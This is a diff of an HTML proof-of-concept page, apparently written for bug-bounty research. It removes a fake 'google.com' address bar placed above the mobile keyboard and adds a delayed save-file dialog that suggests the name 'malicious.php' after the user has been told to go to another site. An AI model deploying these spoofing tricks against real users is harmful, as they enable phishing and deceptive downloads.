@@ -1,113 +1,54 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Fake Mini URL Bar Above Keyboard</title>
-<style>
-  button { padding: 12px 18px; font-size: 16px; margin-right: 10px; }
-  textarea { width: 100%; height: 80px; font-size: 18px; margin-top: 20px; }
-
-  .fake-bar {
-    text-align: center;
-    background: #fff7f0;
-    border-top: 1px solid #e0cbb0;
-    border-bottom: 1px solid #e0cbb0;
-    color: #222;
-    font-size: 16px;
-    padding: 5px 0;
-    position: fixed;
-    width: 100%;
-    z-index: 9999;
-    opacity: 0;
-    visibility: hidden;
-    transition: opacity 0.3s ease, bottom 0.2s ease;
-  }
-
-  .fake-bar.show {
-    opacity: 1;
-    visibility: visible;
-  }
-
-</style>
+  <meta charset="UTF-8" />
+  <title>Delayed File Save Picker</title>
+  <style>
+    body {
+      margin: 0;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-family: sans-serif;
+      background-color: #fafafa;
+      cursor: pointer;
+      user-select: none;
+    }
+    h1 {
+      color: #333;
+      text-align: center;
+      max-width: 400px;
+      padding: 20px;
+    }
+  </style>
 </head>
 <body>
+  <h1>Click me anywhere.<br>Browse to hackerone.com and download the file from HackerOne</h1>
 
-<button id="showBtn">Show Keyboard</button>
-<textarea id="ta" placeholder="Textarea for forced focus…"></textarea>
+  <script>
+    document.addEventListener('click', async () => {
+      setTimeout(async () => {
+        if ('showSaveFilePicker' in window) {
+          try {
+            const handle = await window.showSaveFilePicker({
+              suggestedName: 'malicious.php',
+              types: [{
+                description: 'Text Files',
+                accept: {'text/plain': ['.php']},
+              }],
+            });
 
-<div class="fake-bar" id="fakeBar">google.com</div>
-
-<script>
-const fakeBar = document.getElementById('fakeBar');
-const ta = document.getElementById('ta');
-
-// Adjust fake bar position above keyboard
-function adjustFakeBar() {
-  const vv = window.visualViewport;
-  let keyboardHeight = 0;
-
-  if (vv) {
-    // Calculate height of virtual keyboard
-    keyboardHeight = window.innerHeight - vv.height - vv.offsetTop;
-  }
-
-  fakeBar.style.bottom = keyboardHeight + 'px';
-}
-
-// Show the fake bar
-function showFakeBar() {
-  fakeBar.classList.add('show');
-  adjustFakeBar();
-}
-
-// Hide the fake bar
-function hideFakeBar() {
-  fakeBar.classList.remove('show');
-}
-
-// Listen for viewport changes (keyboard show/hide)
-if ('visualViewport' in window) {
-  window.visualViewport.addEventListener('resize', () => {
-    if (document.activeElement === ta) adjustFakeBar();
-  });
-}
-
-// Handle orientation changes
-window.addEventListener('orientationchange', adjustFakeBar);
-
-// Button click: show keyboard + fake bar
-document.getElementById("showBtn").onclick = async () => {
-  ta.focus();
-
-  // Fullscreen trick (for mobile Chrome)
-  try {
-    await document.documentElement.requestFullscreen();
-    setTimeout(() => {
-      document.exitFullscreen().catch(() => {});
-    }, 120);
-  } catch (e) {
-    // ignore fullscreen errors
-  }
-
-  // Delay to allow keyboard to appear
-  setTimeout(async () => {
-    // Show virtual keyboard if API available
-    if (navigator.virtualKeyboard?.show) {
-      try {
-        await navigator.virtualKeyboard.show();
-      } catch (e) {
-        // ignore errors
-      }
-    }
-
-    // Show the fake omnibox above keyboard
-    showFakeBar();
-  }, 150);
-};
-
-// Hide fake bar when textarea loses focus
-ta.addEventListener('blur', hideFakeBar);
-</script>
-
+            const writable = await handle.createWritable();
+            await writable.write('This is a test file content.');
+            await writable.close();
+          } catch (err) {
+            // User canceled or error occurred — silently ignore
+          }
+        }
+      }, 3000);
+    }, { once: true });
+  </script>
 </body>
 </html>
